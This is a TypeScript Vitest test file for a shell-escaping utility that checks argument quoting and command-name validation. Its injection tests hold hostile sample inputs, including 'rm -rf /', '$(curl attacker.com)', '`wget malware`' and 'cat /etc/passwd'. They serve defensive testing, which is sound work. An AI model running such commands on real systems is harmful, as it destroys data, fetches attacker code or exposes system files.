import { describe, it, expect } from 'vitest';
import { 
  escapeShellArg,
  buildShellCommand,
  validateCommandName,
  ShellCommandError 
} from '../shell-utils.js';

describe('shell-utils', function shellUtilsTests() {
  describe('#escapeShellArg', function escapeShellArgTests() {
    it('should wrap simple arguments in single quotes', function wrapSimple() {
      expect(escapeShellArg('localhost')).toBe("'localhost'");
      expect(escapeShellArg('127.0.0.1')).toBe("'127.0.0.1'");
      expect(escapeShellArg('8080')).toBe("'8080'");
    });

    it('should escape single quotes in arguments', function escapeSingleQuotes() {
      expect(escapeShellArg("host'name")).toBe("'host'\\''name'");
      expect(escapeShellArg("host'test'name")).toBe("'host'\\''test'\\''name'");
    });

    it('should handle arguments with dangerous characters safely', function handleDangerous() {
      expect(escapeShellArg('host; rm -rf /')).toBe("'host; rm -rf /'");
      expect(escapeShellArg('host$(evil)')).toBe("'host$(evil)'");
      expect(escapeShellArg('host`evil`')).toBe("'host`evil`'");
      expect(escapeShellArg('host && evil')).toBe("'host && evil'");
    });

    it('should handle empty and whitespace arguments', function handleEmpty() {
      expect(escapeShellArg('')).toBe("''");
      expect(escapeShellArg('  ')).toBe("'  '");
      expect(escapeShellArg('\t\n')).toBe("'\t\n'");
    });

    it('should reject non-string inputs', function rejectNonString() {
      expect(() => escapeShellArg(123 as any)).toThrow(/must be a string/);
      expect(() => escapeShellArg(null as any)).toThrow(/must be a string/);
    });
  });

  describe('#buildShellCommand', function buildShellCommandTests() {
    it('should build simple commands correctly', function simpleCommands() {
      expect(buildShellCommand(['git', 'status'])).toBe("git 'status'");
      expect(buildShellCommand(['ls', '-la'])).toBe("ls '-la'");
      expect(buildShellCommand(['echo', 'hello'])).toBe("echo 'hello'");
    });

    it('should handle commands with special characters', function specialChars() {
      expect(buildShellCommand(['git', 'commit', '-m', 'fix: handle special chars'])).toBe("git 'commit' '-m' 'fix: handle special chars'");
      expect(buildShellCommand(['echo', 'hello; rm -rf /'])).toBe("echo 'hello; rm -rf /'");
      expect(buildShellCommand(['test', 'arg with spaces'])).toBe("test 'arg with spaces'");
    });

    it('should handle commands with quotes', function quotes() {
      expect(buildShellCommand(['echo', "it's working"])).toBe("echo 'it'\\''s working'");
      expect(buildShellCommand(['git', 'commit', '-m', 'fix: "quoted" message'])).toBe("git 'commit' '-m' 'fix: \"quoted\" message'");
    });

    it('should validate command names', function validateCommand() {
      expect(() => buildShellCommand(['../evil', 'arg'])).toThrow(/Command must be alphanumeric/);
      expect(() => buildShellCommand(['rm -rf', 'arg'])).toThrow(/Command must be alphanumeric/);
      expect(() => buildShellCommand(['/bin/rm', 'arg'])).toThrow(/Command must be alphanumeric/);
      expect(() => buildShellCommand(['evil;cmd', 'arg'])).toThrow(/Command must be alphanumeric/);
    });

    it('should handle valid command names', function validCommands() {
      expect(buildShellCommand(['git', 'status'])).toBe("git 'status'");
      expect(buildShellCommand(['curl-test', 'url'])).toBe("curl-test 'url'");
      expect(buildShellCommand(['test_command', 'arg'])).toBe("test_command 'arg'");
      expect(buildShellCommand(['command123', 'arg'])).toBe("command123 'arg'");
    });

    it('should reject invalid inputs', function invalidInputs() {
      expect(() => buildShellCommand([])).toThrow(/Arguments array cannot be empty/);
      expect(() => buildShellCommand('not-array' as any)).toThrow(/Arguments must be an array/);
    });
  });

  describe('#validateCommandName', function validateCommandNameTests() {
    it('should accept valid command names', function validCommands() {
      expect(validateCommandName('git')).toBe('git');
      expect(validateCommandName('curl-test')).toBe('curl-test');
      expect(validateCommandName('test_command')).toBe('test_command');
      expect(validateCommandName('command123')).toBe('command123');
    });

    it('should reject invalid command names', function invalidCommands() {
      expect(() => validateCommandName('../evil')).toThrow(/Command must be alphanumeric/);
      expect(() => validateCommandName('/bin/rm')).toThrow(/Command must be alphanumeric/);
      expect(() => validateCommandName('evil;cmd')).toThrow(/Command must be alphanumeric/);
      expect(() => validateCommandName('rm -rf')).toThrow(/Command must be alphanumeric/);
    });

    it('should reject non-string inputs', function rejectNonString() {
      expect(() => validateCommandName(123 as any)).toThrow(/must be a string/);
      expect(() => validateCommandName(null as any)).toThrow(/must be a string/);
      expect(() => validateCommandName(undefined as any)).toThrow(/must be a string/);
    });

    it('should reject empty commands', function rejectEmpty() {
      expect(() => validateCommandName('')).toThrow(/cannot be empty/);
    });
  });

  describe('#ShellCommandError', function shellCommandErrorTests() {
    it('should create error with parameter and value info', function createWithInfo() {
      const error = new ShellCommandError('Test message', 'command', 'badvalue');
      
      expect(error.name).toBe('ShellCommandError');
      expect(error.message).toBe('Test message');
      expect(error.parameter).toBe('command');
      expect(error.value).toBe('badvalue');
      expect(error instanceof Error).toBe(true);
      expect(error instanceof ShellCommandError).toBe(true);
    });
  });

  describe('integration with real-world attack patterns', function integrationTests() {
    it('should prevent common command injection patterns in buildShellCommand', function preventCommonInjection() {
      const attackPatterns = [
        // Command chaining
        ['host', '; rm -rf /'],
        ['host', '&& whoami'],
        ['host', '|| id'],
        ['host', '| cat /etc/passwd'],
        
        // Command substitution
        ['host', '$(curl attacker.com)'],
        ['host', '`wget malware`'],
        
        // Invalid command names
        ['../evil', 'arg'],
        ['/bin/rm', 'arg'],
        ['evil;cmd', 'arg']
      ];

      for (const pattern of attackPatterns) {
        if (pattern[0].includes('/') || pattern[0].includes(';') || pattern[0].includes('.')) {
          expect(() => buildShellCommand(pattern)).toThrow();
        } else {
          // For valid command names but dangerous args, it should escape the args safely
          const result = buildShellCommand(pattern);
          expect(result).toContain("'");
        }
      }
    });

    it('should allow legitimate shell command construction', function allowLegitimate() {
      const legitimateCommands = [
        ['git', 'status'],
        ['npm', 'install', 'package-name'],
        ['echo', 'Hello World'],
        ['curl', '-X', 'POST', 'https://api.example.com'],
        ['node', 'script.js', '--verbose']
      ];

      for (const command of legitimateCommands) {
        expect(() => buildShellCommand(command)).not.toThrow();
        const result = buildShellCommand(command);
        expect(typeof result).toBe('string');
        expect(result.length).toBeGreaterThan(0);
        
        // Verify that the result contains the command and all arguments are properly escaped
        expect(result).toContain(command[0]); // Command should be present
        
        // For multi-argument commands, verify they're properly structured
        if (command.length > 1) {
          // Should contain quotes for arguments
          expect(result).toMatch(/'/);
          // Should contain all the arguments in some form
          for (let i = 1; i < command.length; i++) {
            expect(result).toContain(command[i]);
          }
        }
      }
    });
  });

  describe('shell escaping edge cases', function edgeCaseTests() {
    it('should handle complex quote scenarios', function complexQuotes() {
      // Test mixed quotes
      expect(escapeShellArg(`It's a "test"`)).toBe(`'It'\\''s a "test"'`);
      expect(escapeShellArg(`'"mixed"'`)).toBe(`''\\''"mixed"'\\'''`);
    });

    it('should handle special shell characters', function specialChars() {
      const specialChars = ['$', '`', '\\', '"', ';', '&', '|', '(', ')', '{', '}', '[', ']', '<', '>'];
      
      for (const char of specialChars) {
        const testString = `test${char}value`;
        const escaped = escapeShellArg(testString);
        expect(escaped).toBe(`'test${char}value'`);
      }
    });

    it('should handle unicode and international characters', function unicode() {
      expect(escapeShellArg('héllo wörld')).toBe("'héllo wörld'");
      expect(escapeShellArg('测试')).toBe("'测试'");
      expect(escapeShellArg('🚀 rocket')).toBe("'🚀 rocket'");
    });

    it('should handle newlines and control characters', function controlChars() {
      expect(escapeShellArg('line1\nline2')).toBe("'line1\nline2'");
      expect(escapeShellArg('tab\there')).toBe("'tab\there'");
      expect(escapeShellArg('\r\n')).toBe("'\r\n'");
    });
  });
});